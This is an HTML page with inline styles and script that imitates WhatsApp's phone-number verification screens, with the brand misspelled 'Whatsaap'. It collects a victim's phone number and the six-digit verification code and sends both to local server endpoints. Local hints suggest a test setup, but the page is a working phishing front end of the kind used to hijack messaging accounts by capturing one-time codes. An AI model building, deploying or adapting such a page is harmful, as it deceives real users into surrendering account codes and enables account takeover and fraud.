<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#0b1013">
  <title>Enter your number</title>

  <style>
    * {
      box-sizing: border-box;
    }

    :root {
      color-scheme: dark;
      font-family: Arial, Helvetica, sans-serif;
      background: #0b1013;
      color: #f1f3f5;
      font-synthesis: none;
      text-rendering: optimizeLegibility;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    body {
      min-height: 100vh;
      min-height: 100svh;
      margin: 0;
      background: #0b1013;
    }

    .screen {
      width: min(100%, 520px);
      min-height: 100vh;
      min-height: 100svh;
      margin: 0 auto;
      padding: 26px 24px 40px;
      text-align: center;
    }

    .top-bar {
      height: 42px;
      display: flex;
      align-items: center;
      justify-content: flex-end;
    }

    .menu-button {
      width: 42px;
      height: 42px;
      border: 0;
      background: transparent;
      color: #d9dfe2;
      font-size: 27px;
      cursor: pointer;
    }

    h1 {
      margin: 72px 0 18px;
      color: #e5e8ea;
      font-size: clamp(22px, 7vw, 25px);
      font-weight: 400;
      letter-spacing: .1px;
    }

    .intro {
      max-width: 400px;
      margin: 0 auto;
      color: #a4acb1;
      font-size: 16px;
      line-height: 1.55;
    }

    .phone-form {
      width: min(100%, 390px);
      margin: 46px auto 0;
      text-align: left;
    }

    .field-label {
      display: block;
      margin-bottom: 12px;
      color: #cbd1d4;
      font-size: 14px;
    }

    .country-select,
    .phone-input {
      display: block;
      width: 100%;
      min-height: 54px;
      border: 0;
      border-bottom: 2px solid #20c875;
      border-radius: 0;
      background: transparent;
      color: #f1f3f5;
      font: inherit;
      outline: none;
    }

    .country-select {
      padding: 0 8px;
      cursor: pointer;
    }

    .country-select option {
      background: #151b1f;
      color: #f1f3f5;
    }

    .phone-input {
      padding: 0 8px;
      font-size: 18px;
      letter-spacing: .5px;
    }

    .phone-input::placeholder {
      color: #7e898e;
      opacity: 1;
    }

    .country-select:focus,
    .phone-input:focus {
      border-bottom-color: #39df91;
    }

    .phone-label {
      margin-top: 24px;
    }

    .hint {
      min-height: 20px;
      margin: 10px 0 0;
      color: #899399;
      font-size: 12px;
      line-height: 1.5;
    }

    .status {
      min-height: 22px;
      margin: 14px 0 0;
      color: #ff8585;
      font-size: 14px;
      line-height: 1.5;
    }

    .continue-button {
      display: block;
      width: min(100%, 350px);
      min-height: 50px;
      margin: 42px auto 0;
      border: 0;
      border-radius: 26px;
      background: #20c875;
      color: #062412;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
    }

    .continue-button:hover {
      background: #2ddd8b;
    }

    .continue-button:active {
      transform: scale(.99);
    }

    .privacy-note {
      max-width: 370px;
      margin: 28px auto 0;
      color: #778187;
      font-size: 12px;
      line-height: 1.6;
    }

    .verification-screen {
      width: min(100%, 520px);
      min-height: 100vh;
      min-height: 100svh;
      margin: 0 auto;
      padding: 26px 24px 40px;
      text-align: center;
    }

    .verification-screen .top-bar {
      display: flex;
      justify-content: flex-end;
      align-items: center;
      height: 42px;
    }

    .verification-screen h1 {
      margin: 78px 0 34px;
      color: #aab0b4;
      font-size: clamp(27px, 7vw, 28px);
      font-weight: 400;
      letter-spacing: .1px;
    }

    .message {
      max-width: 430px;
      margin: 0 auto;
      color: #92999e;
      font-size: clamp(17px, 4.6vw, 23px);
      line-height: 1.55;
    }

    .phone-number {
      color: #f0f2f3;
      font-weight: 700;
      white-space: nowrap;
    }

    .change-number {
      display: inline-block;
      border: 0;
      padding: 0;
      background: none;
      color: #20c875;
      font: inherit;
      font-weight: 700;
      cursor: pointer;
    }

    .code-form {
      margin-top: 40px;
    }

    .code-label {
      display: block;
      margin-bottom: 14px;
      color: #aab0b4;
      font-size: 14px;
    }

    .code-inputs {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: clamp(7px, 1.8vw, 10px);
    }

    .digit {
      width: clamp(47px, 12vw, 66px);
      height: clamp(62px, 14vw, 78px);
      border: 2px solid #737b80;
      border-radius: 16px;
      outline: none;
      background: transparent;
      color: #f5f7f8;
      text-align: center;
      font-size: clamp(25px, 7vw, 34px);
      font-weight: 500;
      caret-color: #20c875;
      transition: border-color .15s ease, box-shadow .15s ease;
    }

    .digit:focus {
      border-color: #20c875;
      box-shadow: 0 0 0 2px rgb(32 200 117 / 12%);
    }

    .separator {
      width: 12px;
      height: 3px;
      flex: 0 0 12px;
      border-radius: 4px;
      background: #e7eaec;
    }

    .verification-screen .status {
      min-height: 24px;
      margin: 18px 0 0;
      color: #f08080;
      font-size: 14px;
      line-height: 1.5;
    }

    .verify-button {
      width: min(100%, 350px);
      min-height: 50px;
      margin-top: 10px;
      border: 0;
      border-radius: 26px;
      background: #20c875;
      color: #062412;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
    }

    .verify-button:hover {
      background: #28d982;
    }

    .resend {
      margin-top: 58px;
    }

    .resend-button {
      border: 0;
      padding: 8px;
      background: none;
      color: #20c875;
      font-size: 19px;
      font-weight: 600;
      cursor: pointer;
    }

    .resend-button:disabled {
      color: #858d91;
      cursor: default;
    }

    .demo-note {
      max-width: 370px;
      margin: 46px auto 0;
      color: #6e777c;
      font-size: 12px;
      line-height: 1.5;
    }

    @media (max-width: 360px) {
      .screen {
        padding-right: 16px;
        padding-left: 16px;
      }

      .verification-screen {
        padding-right: 14px;
        padding-left: 14px;
      }

      .code-inputs {
        gap: 6px;
      }

      .digit {
        width: 43px;
        height: 58px;
        border-radius: 13px;
      }

      .separator {
        width: 8px;
        flex-basis: 8px;
      }
    }

    @media (prefers-reduced-motion: reduce) {
      *,
      *::before,
      *::after {
        scroll-behavior: auto !important;
        transition-duration: .01ms !important;
      }
    }
  </style>
</head>

<body>
  <main>
    <section class="screen" id="phone-page">
      <header class="top-bar">
        <button class="menu-button" type="button" aria-label="More options">⋮</button>
      </header>

      <h1>Enter your Phone number</h1>

      <p class="intro">
        Whatsaap will need to verify your phone number.
      </p>
      <p class="intro">
        Carrier charges may apply.<b style="color: #2ECC71;"> What's my number?</b>
      </p>

      <form class="phone-form" id="phone-form" novalidate>
        <select
          class="country-select"
          id="country-code"
          aria-label="Country calling code"
        >
          <option value="+91" selected>India +91</option>
          <option value="+1">🇺🇸 United States +1</option>
          <option value="+44">🇬🇧 United Kingdom +44</option>
          <option value="+61">🇦🇺 Australia +61</option>
          <option value="+971">🇦🇪 UAE +971</option>
        </select>

        <input
          class="phone-input"
          id="phone"
          name="phone"
          type="tel"
          inputmode="numeric"
          autocomplete="tel-national"
          maxlength="10"
          pattern="[0-9]{10}"
          placeholder="10-digit number"
          aria-describedby="phone-status"
          required
        >

        <p class="status" id="phone-status" role="status" aria-live="polite"></p>

        <button class="continue-button" type="submit">Next</button>
      </form>
    </section>

    <section class="verification-screen" id="verification-page" hidden>
      <header class="top-bar">
        <button class="menu-button" type="button" aria-label="More options">⋮</button>
      </header>

      <h1>Verifying your number</h1>

      <p class="message">
        Enter the verification code sent to
        <span class="phone-number" id="display-number">+91 ••••••1234</span>.
        <br>
        <button class="change-number" id="change-number" type="button">
          Wrong number?
        </button>
      </p>

      <form class="code-form" id="code-form" novalidate>
        <label class="code-label" for="digit-1">6-digit verification code</label>

        <div class="code-inputs" role="group" aria-label="6-digit verification code">
          <input class="digit" id="digit-1" type="text" inputmode="numeric"
                 autocomplete="one-time-code" maxlength="1" pattern="[0-9]"
                 aria-label="Digit 1 of 6" required>
          <input class="digit" type="text" inputmode="numeric"
                 maxlength="1" pattern="[0-9]" aria-label="Digit 2 of 6" required>
          <input class="digit" type="text" inputmode="numeric"
                 maxlength="1" pattern="[0-9]" aria-label="Digit 3 of 6" required>

          <span class="separator" aria-hidden="true"></span>

          <input class="digit" type="text" inputmode="numeric"
                 maxlength="1" pattern="[0-9]" aria-label="Digit 4 of 6" required>
          <input class="digit" type="text" inputmode="numeric"
                 maxlength="1" pattern="[0-9]" aria-label="Digit 5 of 6" required>
          <input class="digit" type="text" inputmode="numeric"
                 maxlength="1" pattern="[0-9]" aria-label="Digit 6 of 6" required>
        </div>

        <p class="status" id="code-status" role="status" aria-live="polite"></p>

        <button class="verify-button" type="submit">Verify</button>
      </form>

      <div class="resend">
        <button class="resend-button" id="resend-button" type="button">
          Didn’t receive code?
        </button>
      </div>
    </section>

    <section class="verification-screen" id="complete-page" hidden>
      <header class="top-bar">
        <button class="menu-button" type="button" aria-label="More options">⋮</button>
      </header>
      <h1>Verifying your number</h1>
      <p class="message" id="complete-message"></p>
    </section>
  </main>

  <script>
    const phonePage = document.querySelector("#phone-page");
    const verificationPage = document.querySelector("#verification-page");
    const completePage = document.querySelector("#complete-page");
    const phoneForm = document.querySelector("#phone-form");
    const countryCode = document.querySelector("#country-code");
    const phoneInput = document.querySelector("#phone");
    const phoneStatus = document.querySelector("#phone-status");
    const displayNumber = document.querySelector("#display-number");
    const codeForm = document.querySelector("#code-form");
    const inputs = [...document.querySelectorAll(".digit")];
    const codeStatus = document.querySelector("#code-status");
    const resendButton = document.querySelector("#resend-button");
    const changeNumberButton = document.querySelector("#change-number");
    let resendTimer;

    function updateCountryHint() {
      const isIndia = countryCode.value === "+91";
      if (isIndia) {
        phoneInput.maxLength = 10;
        phoneInput.pattern = "[0-9]{10}";
        phoneInput.placeholder = "10-digit number";
      } else {
        phoneInput.maxLength = 15;
        phoneInput.removeAttribute("pattern");
        phoneInput.placeholder = "Phone number";
      }
      phoneInput.value = "";
      phoneStatus.textContent = "";
    }

    countryCode.addEventListener("change", updateCountryHint);
    phoneInput.addEventListener("input", () => {
      const maxDigits = countryCode.value === "+91" ? 10 : 15;
      phoneInput.value = phoneInput.value.replace(/\D/g, "").slice(0, maxDigits);
      phoneStatus.textContent = "";
    });

    phoneForm.addEventListener("submit", async (event) => {
      event.preventDefault();
      const localNumber = phoneInput.value.replace(/\D/g, "");
      const isIndia = countryCode.value === "+91";
      if ((isIndia && localNumber.length !== 10) ||
          (!isIndia && (localNumber.length < 7 || localNumber.length > 15))) {
        phoneStatus.textContent = isIndia
          ? "Enter a valid 10-digit test number."
          : "Enter a phone number between 7 and 15 digits.";
        phoneInput.focus();
        return;
      }

      const phone = countryCode.value + localNumber;
      phoneStatus.style.color = "#899399";
      phoneStatus.textContent = "Connecting…";

      try {
        const response = await fetch("/api/request-code", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ phone })
        });
        const result = await response.json();

        if (!response.ok || !result.success) {
          phoneStatus.style.color = "#ff8585";
          phoneStatus.textContent = result.message || "Request failed.";
          return;
        }

        displayNumber.textContent = phone;
        phoneStatus.textContent = "";
        phonePage.hidden = true;
        verificationPage.hidden = false;
        inputs.forEach((input) => { input.value = ""; });
        inputs[0]?.focus();
      } catch (error) {
        console.error("Phone request failed:", error);
        phoneStatus.style.color = "#ff8585";
        phoneStatus.textContent = "Unable to connect. Open this page at http://localhost:3000.";
      }
    });

    function showStatus(message, isError = false) {
      codeStatus.textContent = message;
      codeStatus.style.color = isError ? "#f08080" : "#20c875";
    }

    function clearCode() {
      inputs.forEach((input) => { input.value = ""; });
      inputs[0]?.focus();
    }

    function startResendCountdown() {
      clearInterval(resendTimer);
      let secondsLeft = 30;
      resendButton.disabled = true;
      resendButton.textContent = `Resend code in ${secondsLeft}s`;
      resendTimer = setInterval(() => {
        secondsLeft -= 1;
        if (secondsLeft <= 0) {
          clearInterval(resendTimer);
          resendButton.disabled = false;
          resendButton.textContent = "Didn’t receive code?";
        } else {
          resendButton.textContent = `Resend code in ${secondsLeft}s`;
        }
      }, 1000);
    }

    inputs.forEach((input, index) => {
      input.addEventListener("input", () => {
        input.value = input.value.replace(/\D/g, "").slice(-1);
        showStatus("");
        if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
      });
      input.addEventListener("keydown", (event) => {
        if (event.key === "Backspace" && !input.value && index > 0) {
          inputs[index - 1].value = "";
          inputs[index - 1].focus();
        } else if (event.key === "ArrowLeft" && index > 0) {
          inputs[index - 1].focus();
        } else if (event.key === "ArrowRight" && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
      });
      input.addEventListener("paste", (event) => {
        event.preventDefault();
        const pastedDigits = (event.clipboardData || window.clipboardData)
          .getData("text").replace(/\D/g, "").slice(0, inputs.length);
        pastedDigits.split("").forEach((digit, position) => { inputs[position].value = digit; });
        const nextEmptyIndex = inputs.findIndex((item) => !item.value);
        inputs[nextEmptyIndex === -1 ? inputs.length - 1 : nextEmptyIndex].focus();
        showStatus("");
      });
    });

    codeForm.addEventListener("submit", async (event) => {
      event.preventDefault();
      const code = inputs.map((input) => input.value).join("");
      if (!/^\d{6}$/.test(code)) {
        showStatus("Enter 6 digits to continue.", true);
        inputs.find((input) => !input.value)?.focus();
        return;
      }

      try {
        const response = await fetch("/api/verify-code", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ code })
        });
        const result = await response.json();

        if (!response.ok) {
          showStatus(result.message || "Verification request failed.", true);
          return;
        }

        verificationPage.hidden = true;
        completePage.hidden = false;
        document.querySelector("#complete-message").textContent =
          result.success
            ? "Verification Successfull."
            : "Verification failed";
      } catch (error) {
        console.error("Code request failed:", error);
        showStatus("Unable to connect to the local server.", true);
      }
    });

    resendButton.addEventListener("click", () => {
      if (resendButton.disabled) return;
      clearCode();
      showStatus("");
      startResendCountdown();
    });

    changeNumberButton.addEventListener("click", () => {
      clearInterval(resendTimer);
      resendButton.disabled = false;
      resendButton.textContent = "Didn’t receive code?";
      clearCode();
      showStatus("");
      verificationPage.hidden = true;
      phonePage.hidden = false;
      phoneInput.focus();
    });
  </script>
</body>
</html>
